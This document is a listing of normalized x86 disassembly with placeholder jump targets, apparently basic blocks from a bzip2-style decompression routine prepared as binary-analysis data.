mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0xc ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
mov edx 0x1
test edx edx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] 0xfffffffd
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffd
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0xc54 ] 0x0
jne r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
cmp [ ebp - 0x18 ] 0x100
jge r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov edx 0x1
test edx edx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
movzx edx [ ebp - 0xd1 ]
cmp edx [ ebp - 0x68 ]
jge r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov [ ebp - 0x6c ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
cmp [ ebp - 0x28 ] 0x14
jle r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x34 ] 0x0
jl r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x20 ]
jne r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp [ ebp - 0x34 ] 0x1
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x18 ]
mov [ edx + 0xc6c ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_410700
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc68 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x18 ]
movzx edx [ ecx + 0xd6c ]
test edx edx
je r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
movzx eax [ ebp - 0xd1 ]
mov cl [ ebp - 0xd1 ]
mov [ ebp + eax - 0xe0 ] cl
jmp r-xdata
mov edx [ ebp - 0x6c ]
cmp edx [ ebp - 0x68 ]
jge r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x34 ]
cmp ecx [ ebp - 0x4 ]
jl r-xdata
cmp [ ebp - 0x34 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x30 ]
add ecx [ ebp - 0x50 ]
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov edx [ ebp - 0x30 ]
add edx 0x1
mov [ ebp - 0x30 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1e7c ]
mov edx [ ebp + 0x8 ]
movzx eax [ edx + ecx + 0xe7c ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + eax + 0xd7c ]
mov [ ebp - 0x39 ] dl
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x40 ]
add edx [ ebp - 0x30 ]
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x40 ] edx
mov edx [ ebp + 0x8 ]
movzx eax [ edx + 0x28 ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x10
jge r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc68 ]
add edx 0x2
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov [ ebp - 0x74 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x64 ]
jge r-xdata
mov cl [ ebp - 0xd1 ]
add cl 0x1
mov [ ebp - 0xd1 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc68 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
imul edx edx 0x186a0
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x60 ] 0xffffffff
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov [ ebp - 0x8 ] 0x20
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x444 ] 0x0
mov [ ebp - 0x18 ] 0x1
jmp r-xdata
mov [ ebp - 0x30 ] 0xffffffff
mov [ ebp - 0x50 ] 0x1
cmp [ ebp - 0x34 ] 0x1
jne r-xdata
mov edx [ ebp - 0x50 ]
shl edx 0x1
mov [ ebp - 0x50 ] edx
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x30 ]
lea ecx [ eax + edx * 2 ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
cmp [ ebp - 0x74 ] 0x10
jge r-xdata
mov [ ebp - 0x6c ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x18 ]
mov dl [ ecx + 0x650e ]
mov [ ebp - 0xd1 ] dl
movzx eax [ ebp - 0xd1 ]
mov cl [ ebp + eax - 0xe0 ]
mov [ ebp - 0xd2 ] cl
cmp [ ebp - 0x18 ] 0xff
jg r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x38 ]
jge r-xdata
cmp [ ebp - 0x18 ] 0x100
jg r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x14 ]
jl r-xdata
mov ecx [ ebp - 0x70 ]
sub ecx 0x1
mov [ ebp - 0x70 ] ecx
mov edx [ ebp - 0x40 ]
mov [ ebp - 0x4c ] edx
mov eax [ ebp - 0x60 ]
add eax 0x1
mov [ ebp - 0x60 ] eax
mov ecx [ ebp - 0x60 ]
cmp ecx [ ebp - 0x64 ]
jl r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x14 ]
jl r-xdata
mov edx [ ebp - 0x6c ]
cmp edx [ ebp - 0x68 ]
jge r-xdata
mov cl [ ebp - 0xd2 ]
mov [ ebp - 0xe0 ] cl
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x18 ]
mov al [ ebp - 0xd2 ]
mov [ edx + 0x1ebc ] al
jmp r-xdata
movzx eax [ ebp - 0xd1 ]
movzx ecx [ ebp - 0xd1 ]
mov dl [ ebp + eax - 0xe1 ]
mov [ ebp + ecx - 0xe0 ] dl
mov al [ ebp - 0xd1 ]
sub al 0x1
mov [ ebp - 0xd1 ] al
jmp r-xdata
mov [ ebp - 0xf0 ] 0xfff
mov [ ebp - 0xf4 ] 0xf
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x40 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x38 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0x6c ]
imul edx edx 0x102
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edx + 0xab60 ]
push ecx
mov edx [ ebp - 0x6c ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edx + 0xe1cc ]
push ecx
mov edx [ ebp - 0x6c ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edx + 0xc99c ]
push ecx
mov edx [ ebp - 0x6c ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edx + 0xb16c ]
push ecx
call sub_410770
add esp 0x1c
mov edx [ ebp - 0x6c ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + edx * 4 + 0xf9fc ] ecx
jmp r-xdata
mov edx [ ebp - 0x6c ]
imul edx edx 0x102
add edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + edx + 0xab60 ]
cmp ecx [ ebp - 0x1c ]
jle r-xdata
mov [ ebp - 0x18 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov esi [ ebp + 0x8 ]
mov eax [ esi + eax * 4 + 0x3c ]
mov [ edx + ecx * 4 + 0x444 ] eax
jmp r-xdata
mov eax [ ebp - 0x34 ]
sub eax 0x1
mov [ ebp - 0x114 ] eax
cmp [ ebp - 0x114 ] 0x10
jae r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov [ ebp - 0x70 ] 0x32
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x60 ]
movzx eax [ edx + 0x1ebc ]
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x48 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xf9fc ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xb16c ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xe1cc ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xc99c ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
movzx ecx [ ebp - 0x39 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4c ]
mov edx [ ebp - 0x4 ]
mov [ eax + edx * 4 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x30 ]
sub ecx 0x1
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
movzx dx [ ebp - 0x39 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc50 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x30 ]
sub edx 0x1
mov [ ebp - 0x30 ] edx
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
movzx edx [ ebp - 0xd1 ]
test edx edx
jle r-xdata
cmp [ ebp - 0xf4 ] 0x0
jl r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x6c ]
add ecx 0x1
mov [ ebp - 0x6c ] ecx
mov edx [ ebp - 0x6c ]
imul edx edx 0x102
add edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + edx + 0xab60 ]
cmp ecx [ ebp - 0x8 ]
jge r-xdata
mov edx [ ebp - 0x6c ]
imul edx edx 0x102
add edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + edx + 0xab60 ]
mov [ ebp - 0x1c ] ecx
cmp [ ebp - 0x18 ] 0x100
jg r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x114 ]
shr eax 0x4
mov [ ebp - 0x120 ] eax
mov eax [ ebp - 0x114 ]
xor edx edx
mov ecx 0x10
div ecx
mov [ ebp - 0x110 ] edx
mov edx [ ebp - 0x120 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x1e7c ]
add ecx [ ebp - 0x110 ]
mov [ ebp - 0x10c ] ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x10c ]
mov al [ edx + 0xe7c ]
mov [ ebp - 0x39 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1e7c ]
mov [ ebp - 0x10c ] edx
mov eax [ ebp - 0x10c ]
add eax [ ebp - 0x114 ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + eax + 0xe7c ]
mov [ ebp - 0x39 ] dl
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov [ ebp - 0xf8 ] 0xf
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x6c ]
imul edx edx 0x102
add edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + edx + 0xab60 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x444 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
add ecx [ eax + edx * 4 + 0x440 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0x444 ] ecx
jmp r-xdata
mov edx [ ebp - 0x120 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x1e7c ]
add ecx 0x1
mov edx [ ebp - 0x120 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0x1e7c ] ecx
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x10c ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x10c ]
mov al [ edx + 0xe7b ]
mov [ ecx + 0xe7c ] al
mov ecx [ ebp - 0x10c ]
sub ecx 0x1
mov [ ebp - 0x10c ] ecx
jmp r-xdata
cmp [ ebp - 0x114 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x10c ]
add eax [ ebp - 0x114 ]
mov [ ebp - 0x128 ] eax
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x128 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x128 ]
mov al [ edx + 0xe7b ]
mov [ ecx + 0xe7c ] al
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x128 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x128 ]
mov al [ edx + 0xe7a ]
mov [ ecx + 0xe7b ] al
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x128 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x128 ]
mov al [ edx + 0xe79 ]
mov [ ecx + 0xe7a ] al
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x128 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x128 ]
mov al [ edx + 0xe78 ]
mov [ ecx + 0xe79 ] al
mov ecx [ ebp - 0x114 ]
sub ecx 0x4
mov [ ebp - 0x114 ] ecx
jmp r-xdata
mov eax [ ebp - 0x70 ]
sub eax 0x1
mov [ ebp - 0x70 ] eax
mov ecx [ ebp - 0x40 ]
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x60 ]
add edx 0x1
mov [ ebp - 0x60 ] edx
mov eax [ ebp - 0x60 ]
cmp eax [ ebp - 0x64 ]
jl r-xdata
cmp [ ebp - 0xf8 ] 0x0
jl r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x100
jg r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1e7c ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1e7c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1e7c ]
mov eax [ ebp + 0x8 ]
mov cl [ ebp - 0x39 ]
mov [ eax + edx + 0xe7c ] cl
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x1e7c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x120 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0x1e7c ]
sub eax 0x1
mov ecx [ ebp - 0x120 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x1e7c ] eax
mov eax [ ebp - 0x120 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x1e78 ]
mov eax [ ebp - 0x120 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0x1e7c ]
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov dl [ esi + edx + 0xe8b ]
mov [ ecx + eax + 0xe7c ] dl
mov eax [ ebp - 0x120 ]
sub eax 0x1
mov [ ebp - 0x120 ] eax
jmp r-xdata
mov ecx [ ebp - 0x120 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10c ]
cmp eax [ edx + ecx * 4 + 0x1e7c ]
jle r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x10c ]
mov dl [ ebp - 0x39 ]
mov [ ecx + 0xe7c ] dl
jmp r-xdata
mov edx [ ebp - 0x10c ]
add edx [ ebp - 0x114 ]
mov eax [ ebp - 0x10c ]
add eax [ ebp - 0x114 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov dl [ esi + edx + 0xe7b ]
mov [ ecx + eax + 0xe7c ] dl
mov eax [ ebp - 0x114 ]
sub eax 0x1
mov [ ebp - 0x114 ] eax
jmp r-xdata
cmp [ ebp - 0x114 ] 0x3
jbe r-xdata
mov [ ebp - 0x70 ] 0x32
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x60 ]
movzx edx [ ecx + 0x1ebc ]
mov [ ebp - 0x48 ] edx
mov eax [ ebp - 0x48 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0x48 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0xb16c ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x48 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0xe1cc ]
mov [ ebp - 0x58 ] edx
mov eax [ ebp - 0x48 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0xc99c ]
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp - 0xf0 ]
add edx 0x1
mov eax [ ebp - 0xf4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x1e7c ] edx
jmp r-xdata
mov edx [ ebp - 0xf4 ]
shl edx 0x4
add edx [ ebp - 0xf8 ]
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0xf0 ]
mov [ eax + 0xe7c ] dl
mov ecx [ ebp - 0xf0 ]
sub ecx 0x1
mov [ ebp - 0xf0 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc60 ] 0xffffffff
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x2
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x30 ] 0x2
jl r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + edx * 4 + 0x444 ] 0x0
jl r-xdata
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + eax + 0xd7c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x40 ]
add ecx 0x1
movzx edx [ ebp - 0x39 ]
mov eax [ ebp + 0x8 ]
movzx edx [ eax + edx + 0xd7c ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0x40 ] ecx
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x28 ]
test edx edx
je r-xdata
mov [ ebp - 0x118 ] 0xfff
mov [ ebp - 0x11c ] 0xf
jmp r-xdata
cmp [ ebp - 0x120 ] 0x0
jle r-xdata
mov eax [ ebp - 0xf4 ]
sub eax 0x1
mov [ ebp - 0xf4 ] eax
mov ecx [ ebp - 0xf8 ]
sub ecx 0x1
mov [ ebp - 0xf8 ] ecx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x28 ]
test ecx ecx
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0x444 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
movzx ecx [ ebp - 0x39 ]
mov edx [ ebp + 0x8 ]
movzx eax [ edx + ecx + 0xd7c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4c ]
mov ecx [ ebp - 0x4 ]
mov [ edx + ecx * 4 ] eax
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
movzx dx [ ecx + eax + 0xd7c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc50 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp [ ebp - 0x11c ] 0x0
jl r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x70 ]
sub ecx 0x1
mov [ ebp - 0x70 ] ecx
mov edx [ ebp - 0x40 ]
mov [ ebp - 0x4c ] edx
mov eax [ ebp - 0x60 ]
add eax 0x1
mov [ ebp - 0x60 ] eax
mov ecx [ ebp - 0x60 ]
cmp ecx [ ebp - 0x64 ]
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov [ ebp - 0x124 ] 0xf
jmp r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x4 ]
jge r-xdata
cmp [ ebp - 0x18 ] 0x100
jg r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x70 ] 0x32
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x60 ]
movzx eax [ edx + 0x1ebc ]
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x48 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xf9fc ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xb16c ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xe1cc ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xc99c ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
cmp [ ebp - 0x124 ] 0x0
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4c ]
mov eax [ edx + eax * 4 ]
shr eax 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x38 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x440 ] 0x0
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4c ]
mov ecx [ ebp - 0x18 ]
mov edx [ eax + ecx * 4 ]
and edx 0xff
mov [ ebp - 0x39 ] dl
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x444 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc4c ]
mov eax [ ebp - 0x18 ]
shl eax 0x8
or eax [ ecx + edx * 4 ]
movzx ecx [ ebp - 0x39 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0x444 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc4c ]
mov [ edx + ecx * 4 ] eax
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x444 ]
add edx 0x1
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x444 ] edx
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
mov esi [ ebp + 0x8 ]
mov edx [ esi + edx * 4 + 0x444 ]
mov [ ecx + eax * 4 + 0x848 ] edx
jmp r-xdata
mov eax [ ebp - 0x118 ]
add eax 0x1
mov ecx [ ebp - 0x11c ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x1e7c ] eax
jmp r-xdata
mov edx [ ebp - 0x11c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x1e7c ]
add ecx [ ebp - 0x124 ]
mov edx [ ebp + 0x8 ]
